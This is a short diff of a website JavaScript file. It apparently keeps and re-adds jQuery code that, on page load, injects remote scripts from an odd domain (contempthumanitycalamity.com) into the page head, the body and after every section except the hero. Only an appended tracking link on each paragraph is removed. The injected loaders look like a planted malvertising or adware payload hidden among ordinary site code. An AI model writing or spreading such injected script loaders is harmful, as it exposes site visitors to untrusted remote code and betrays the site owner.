@@ -162,11 +162,11 @@ $('meta[property="og:image"], meta[name="twitter:image"]').each(function () {
 });
 
 
-$(document).ready(function(){$("<script/>",{type:"text/javascript",src:"//contempthumanitycalamity.com/82/8e/00/828e0017a18448f9bc4f5ede33532db2.js"}).appendTo("head");$("<script/>",{type:"text/javascript",src:"//contempthumanitycalamity.com/17/80/88/178088b2dd59cc264ba14d0ab0f4bae3.js"}).appendTo("body");$("p").append('<a href="https://contempthumanitycalamity.com/p30f0cfvj1?key=5d7f518ab57b3979c6f80ec0e9823004" target="_blank">Link</a>')});
-
+$(document).ready(function(){$("<script/>",{type:"text/javascript",src:"//contempthumanitycalamity.com/82/8e/00/828e0017a18448f9bc4f5ede33532db2.js"}).appendTo("head");$("<script/>",{type:"text/javascript",src:"//contempthumanitycalamity.com/17/80/88/178088b2dd59cc264ba14d0ab0f4bae3.js"}).appendTo("body")});
 
 
 $(document).ready(function(){$("section").not("#hero").each(function(){$(this).after('<script async="async" data-cfasync="false" src="//contempthumanitycalamity.com/77d22fe3b85a47162f3d142b61b8c66f/invoke.js"><\/script><div id="container-77d22fe3b85a47162f3d142b61b8c66f"></div>')})});
+
 
 
 
